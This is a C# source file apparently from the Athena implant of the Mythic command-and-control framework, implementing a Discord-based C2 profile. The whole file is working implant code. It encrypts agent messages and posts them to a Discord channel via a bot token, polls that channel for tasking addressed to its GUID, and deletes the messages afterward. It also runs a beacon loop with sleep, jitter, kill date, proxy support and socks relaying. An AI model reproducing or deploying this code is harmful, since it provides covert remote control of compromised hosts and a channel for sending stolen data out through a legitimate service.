using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Profiles.Discord.Models;
using Athena.Utilities;

using System.Diagnostics;
using System.Net;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;

namespace Profiles
{
    public class Discord : IProfile
    {
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        private string messageToken { get; set; }
        private int messageChecks { get; set; }
        public PSKCrypto crypt { get; set; }
        public string psk { get; set; }
        private bool encryptedExchangeCheck { get; set; }
        private HttpClient discordClient { get; set; }
        private string BotToken { get; set; }
        private string ChannelID { get; set; }
        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
        private string userAgent { get; set; }
        private string proxyHost { get; set; }
        private string proxyPass { get; set; }
        private string proxyUser { get; set; }
        private int currentAttempt = 0;
        private int maxAttempts = 5;
        private CancellationTokenSource cts = new CancellationTokenSource();
        private string agent_guid = Guid.NewGuid().ToString();
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        public Discord()
        {
            this.uuid = "%UUID%";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.messageToken = "discord_token";
            this.ChannelID = "bot_channel";
            this.userAgent = "%USERAGENT%";
            this.messageChecks = int.Parse("message_checks");
            this.timeBetweenChecks = int.Parse("time_between_checks");
            this.proxyHost = "proxy_host:proxy_port";
            this.proxyPass = "proxy_pass";
            this.proxyUser = "proxy_user";
            this.psk = "AESPSK";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            HttpClientHandler handler = new HttpClientHandler();

            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    wp.Credentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }
            else
            {
                handler.UseDefaultCredentials = true;
                handler.Proxy = WebRequest.GetSystemWebProxy();
            }

            this.discordClient = new HttpClient(handler);
            this.discordClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bot", this.messageToken);

            if (!String.IsNullOrEmpty(this.userAgent))
            {
                this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }
        }
        //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
        public async Task<string> Send(string json)
        {
            try
            {
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    message = json,
                    id = 0,
                    final = true,
                    sender_id = agent_guid,
                    to_server = true
                };

                string strMsg = JsonSerializer.Serialize(msg);
                if (strMsg.Length > 1950)
                {
                    await SendAttachment(strMsg);
                }
                else
                {
                    await SendMessage(strMsg);
                }

                List<MythicMessageWrapper> agentMessages = new List<MythicMessageWrapper>();
                List<string> msgToRemove = new List<string>();
                int checkins = 0;
                do
                {
                    await Task.Delay(this.timeBetweenChecks * 1000);

                    var messages = await ReadMessages();
                    foreach (var message in messages)
                    {
                        MythicMessageWrapper currentMessage;
                        if (message.attachments.Count > 0)
                        {
                            foreach (var attachment in message.attachments)
                            {
                                if (attachment.filename.Contains(this.agent_guid) && !attachment.filename.EndsWith("server"))
                                {
                                    currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(await GetFileContentsAsync(attachment.url));
                                    if (currentMessage is not null && currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                    {
                                        agentMessages.Add(currentMessage);
                                        msgToRemove.Add(message.id);
                                    }
                                }
                            }
                        }
                        else
                        {
                            if (message.content.Contains(this.agent_guid))
                            {
                                currentMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.content);
                                if (currentMessage.sender_id == this.agent_guid && currentMessage.to_server == false)
                                {
                                    agentMessages.Add(currentMessage);
                                    msgToRemove.Add(message.id);
                                }
                            }
                        }
                    }
                    checkins++;
                    if (checkins == this.messageChecks)
                    {
                        return "";
                    }

                } while (agentMessages.Count() < 1);

                //No concept of chunking yet, so just grab one
                string strRes = agentMessages.FirstOrDefault().message;

                DeleteMessages(msgToRemove);

                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(strRes);
                }
                else
                {
                    if (String.IsNullOrEmpty(strRes))
                    {
                        return json;
                    }
                    else
                    {
                        return (await Misc.Base64Decode(strRes)).Substring(36);
                    }
                }
            }
            catch (Exception e)
            {
                return "";
            }
        }
        public async Task<bool> SendMessage(string msg)
        {
            string url = "https://discord.com/api/channels/" + this.ChannelID + "/messages";

            Dictionary<string, string> Payload = new Dictionary<string, string>()
            {
              {"content" , msg }
            };

            StringContent content = new StringContent(JsonSerializer.Serialize(Payload), Encoding.UTF8, "application/json");
            HttpResponseMessage res = await discordClient.PostAsync(url, content);

            return res.IsSuccessStatusCode ? true : false;
        }

        public async Task<List<ServerDetails>> ReadMessages()
        {
            var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
            var res = await discordClient.GetAsync(url);
            string ResponseMessages = await res.Content.ReadAsStringAsync();
            return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
        }

        public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
        {
            try
            {
                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(msg));
                using (MemoryStream memStream = new MemoryStream(msgBytes)) //8mb max filesize
                {
                    var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
                    var Content = new MultipartFormDataContent();
                    var File_Content = new ByteArrayContent(await new StreamContent(memStream).ReadAsByteArrayAsync());
                    File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
                    File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                    {
                        FileName = agent_guid + ".server",
                    };
                    Content.Add(File_Content);
                    var res = await discordClient.PostAsync(URL, Content);


                    if (res.IsSuccessStatusCode)
                    {
                        return true;
                    }
                    return false;
                }
            }
            catch (Exception e)
            {
                return false;
            }

        }

        private async Task<string> GetFileContentsAsync(string url)
        {
            string message;
            HttpClient client = new HttpClient(); //Needed to create a new one because potentially the headers causing a 401 unauthorized response?

            using (HttpResponseMessage response = await client.GetAsync(url))
            {
                using (HttpContent content = response.Content)
                {
                    message = await content.ReadAsStringAsync();
                }

                if (response.IsSuccessStatusCode)
                {
                    return await Unescape(message);
                }
                return "";
            }
        }

        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
        public async Task<bool> DeleteMessages(List<string> messages) //server and guild are the same lol
        {
            bool success = false;
            foreach (var id in messages)
            {
                var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/messages/" + id;
                var res = await discordClient.DeleteAsync(url);
                success = res.IsSuccessStatusCode;
            }

            return success;
        }

        public async Task StartBeacon()
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask);

                List<string> responses = await responseTask;

                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = await delegateTask,
                    socks = await socksTask,
                    responses = responses,
                };
                try
                {
                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));

                    if (String.IsNullOrEmpty(responseString))
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (gtr == null)
                    {
                        this.currentAttempt++;
                        continue;
                    }

                    this.currentAttempt = 0;

                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                    this.SetTaskingReceived(this, tra);
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
        }

        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

                if (!string.IsNullOrEmpty(res))
                {
                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return new CheckinResponse()
            {
                status = "failed"
            };
        }
    }
}